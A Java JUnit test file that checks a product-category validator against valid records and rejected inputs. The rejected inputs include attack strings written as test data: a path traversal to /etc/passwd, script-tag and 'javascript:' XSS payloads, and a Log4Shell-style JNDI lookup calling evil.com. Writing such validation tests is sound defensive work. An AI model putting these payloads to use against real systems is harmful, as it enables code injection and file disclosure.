package com.reyesemf.gm.article.infrastructure;

import com.reyesemf.gm.article.domain.model.Category;
import org.junit.jupiter.api.Test;

import java.util.function.Consumer;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

public class CategoryValidatorTest {
    private final Consumer<Category> categoryValidator = new CategoryValidator();

    @Test
    public void givenValidCategoryWhenAcceptThenDoesNotThrow() {
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Electronics", "Electronic gadgets and components", "https://example.com/electronics.jpg", "https://example.com/electronics")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Books", "Books and literature", "https://cdn.example.com/books.png", "https://example.com/books")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Sports", "Sports equipment and gear", "https://images.example.com/sports.jpg", "https://example.com/sports")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Home", "Home and garden products", "https://static.example.com/home.jpg", "https://example.com/home")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Fashion", "Clothing and accessories", "https://assets.example.com/fashion.jpg", "https://example.com/fashion")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Technology", "Technology products", "https://example.com/tech.jpg", "https://example.com/technology")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Music", "Musical instruments", "https://example.com/music.jpg", "https://example.com/music")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Games", "Video games and toys", "https://example.com/games.jpg", "https://example.com/games")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Food", "Food and beverages", "https://example.com/food.jpg", "https://example.com/food")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Automotive", "Car parts and accessories", "https://example.com/auto.jpg", "https://example.com/automotive")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Beauty", "Beauty and cosmetics", "https://example.com/health.jpg", "https://example.com/health")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Pets", "Pet supplies and accessories", "https://example.com/pets.jpg", "https://example.com/pets")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Arts", "Arts and crafts supplies", "https://example.com/art.jpg", "https://example.com/art")));
        assertDoesNotThrow(() -> categoryValidator.accept(createValidCategory("Travel", "Travel accessories", "https://example.com/travel.jpg", "https://example.com/travel")));
    }
    
    @Test
    public void givenInvalidCategoryWhenAcceptThenThrowsIllegalArgumentException() {
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("localhost", "Local server category", "https://example.com/image.jpg", "https://example.com/local")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Sports", "Connect to 127.0.0.1 for data", "https://example.com/sports.jpg", "https://example.com/sports")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Tech", "Visit http://internal.server", "https://example.com/tech.jpg", "https://example.com/tech")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("admin", "Admin category", "https://example.com/admin.jpg", "https://example.com/admin")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("test", "Test category", "https://example.com/test.jpg", "https://example.com/test")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Electronics", "../../../etc/passwd", "https://example.com/electronics.jpg", "https://example.com/electronics")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Books", "Books collection with http://192.168.1.1", "https://example.com/books.jpg", "https://example.com/books")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Home", "Home products with localhost reference", "https://example.com/home.jpg", "https://example.com/home")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Fashion", "<script>alert('xss')</script>", "https://example.com/fashion.jpg", "https://example.com/fashion")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Health", "${jndi:ldap://evil.com}", "https://example.com/health.jpg", "https://example.com/health")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Electronics", "Electronic devices and gadgets", "https://example.com/electronics.jpg", "https://example.com/electronics")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Games", "Gaming products", "javascript:alert(1)", "https://example.com/games")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Food", "Food items", "https://example.com/food.jpg", "data:text/html,<script>")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Auto", "Automotive", "not-a-url", "https://example.com/auto")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Health", "Health products", "https://example.com/health.jpg", "example.com")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Pets", "Pet supplies", "", "https://example.com/pets")));
        assertThrows(IllegalArgumentException.class, () -> categoryValidator.accept(createInvalidCategory("Art", "Art supplies", "https://example.com/art.jpg", "")));
    }
    
    @Test
    public void givenNullCategoryWhenAcceptThenThrowsNullPointerException() {
        assertThrows(NullPointerException.class, () -> categoryValidator.accept(null));
    }
    
    private Category createValidCategory(String name, String description, String image, String url) {
        Category category = new Category();
        category.setName(name);
        category.setDescription(description);
        category.setImage(image);
        category.setUrl(url);
        return category;
    }
    
    private Category createInvalidCategory(String name, String description, String image, String url) {
        Category category = new Category();
        category.setName(name);
        category.setDescription(description);
        category.setImage(image);
        category.setUrl(url);
        return category;
    }
}